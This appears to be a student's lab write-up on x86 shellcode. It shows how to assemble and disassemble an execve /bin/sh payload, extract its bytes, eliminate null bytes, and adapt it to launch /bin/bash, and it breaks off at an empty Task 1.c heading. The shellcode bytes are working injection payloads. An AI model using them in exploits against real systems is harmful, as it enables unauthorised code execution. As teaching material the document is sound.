# Lab 10 - Shellcode

# Task 1.a - the entire process
- compile to object code: `nasm -f elf32 mysh.s -o mysh.o`
- Linking to generate final binary: `ld -m elf_i386 mysh.o -o mysh`
- check shell process: `echo $$`
  > 1
- launch the executable: `./mysh`
- check shell process again: `echo $$`
  > 43
- Getting the machine code: `objdump -Mintel --disassemble mysh.o`
  ```bash
  mysh.o:     file format elf32-i386


  Disassembly of section .text:

  00000000 <_start>:
    0:	31 c0                	xor    eax,eax
    2:	50                   	push   eax
    3:	68 2f 2f 73 68       	push   0x68732f2f
    8:	68 2f 62 69 6e       	push   0x6e69622f
    d:	89 e3                	mov    ebx,esp
    f:	50                   	push   eax
    10:	53                   	push   ebx
    11:	89 e1                	mov    ecx,esp
    13:	31 d2                	xor    edx,edx
    15:	31 c0                	xor    eax,eax
    17:	b0 0b                	mov    al,0xb
    19:	cd 80                	int    0x80

  ```
- use xxd: `xxd -p -c 20 mysh.o`
  ```bash
  7f454c4601010100000000000000000001000300
  0100000000000000000000004000000000000000
  3400000000002800050002000000000000000000
  0000000000000000000000000000000000000000
  0000000000000000000000000000000000000000
  0000000001000000010000000600000000000000
  100100001b000000000000000000000010000000
  0000000007000000030000000000000000000000
  3001000021000000000000000000000001000000
  0000000011000000020000000000000000000000
  6001000040000000040000000300000004000000
  1000000019000000030000000000000000000000
  a00100000f000000000000000000000001000000
  00000000000000000000000031c050682f2f7368
  682f62696e89e3505389e131d231c0b00bcd8000
  00000000002e74657874002e7368737472746162
  002e73796d746162002e73747274616200000000
  0000000000000000000000000000000000000000
  0000000000000000010000000000000000000000
  0400f1ff00000000000000000000000003000100
  08000000000000000000000010000100006d7973
  682e73005f73746172740000
  ```
- "should be" shellcode: `31c050682f2f7368682f62696e89e3505389e131d231c0b00bcd80`
- execute the py script: `./convert.py`
  ```python
  shellcode= (
   "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50"
   "\x53\x89\xe1\x31\xd2\x31\xc0\xb0\x0b\xcd\x80"
  ).encode('latin-1')
  ```

---

# Task 1.b - Eliminating Zeros from the Code
## Questions & identify 4 places
### 1-2-3
- lines 5, 17 and 20
  - xor eax/edx
- (sidenote): 
  - pushing a value (not necessarily stored in a register) means writing it to the stack
  - popping means restoring whatever is on top of the stack into a register. 
> Explain why `xor eax, eax` works
- that's basically how the xor works, it's "true" only if the two operands are different, so if you do the xor between the same thing they're always going to be equal hence the result is going to be 0 in any case
### 4
- lines 21
- first it reset eax to 0, and then exploits al to set 0b at the end:
  ```mov   al, 0x0b```

### actual task
- build and run our custom mybash.s:
  `nasm -f elf32 mybash.s -o mybash.o && ld -m elf_i386 mybash.o -o mybash && ./mybash`
- in our custom mybash.sh as last thing we push the first 8 bytes of our instruction (`/bin` ; `/bas`)
- then we use a register to hold a string with the 9th byte of the command (`h`) with a 3-characters placeholder at the end (`###`)
- then we use the shift approach to delete the whole placeholder, in order to have our sweet command (`/bin/bash`)
```asm
mov esi, "h###"
shl esi, 24
shr esi, 24
push esi
push "/bas"
push "/bin"
```
- we could also use the eax register, but in that case we also need to "clean it" afterwards since it's used later, bringing it back to 0:
  ```asm
  mov eax, "h###"
  shl eax, 24
  shr eax, 24
  push eax
  push "/bas"
  push "/bin"
  xor  eax, eax
  ```
- As required, we are not using any redundant `/` neither any 0, but just exploiting one of the "zeroing" mechanism (the shift one)
- in the original script we found the first two approaches explained in the readme used, and we adopted the third one to solve the task.

---

# Task 1.c - Providing Arguments for System Calls
- 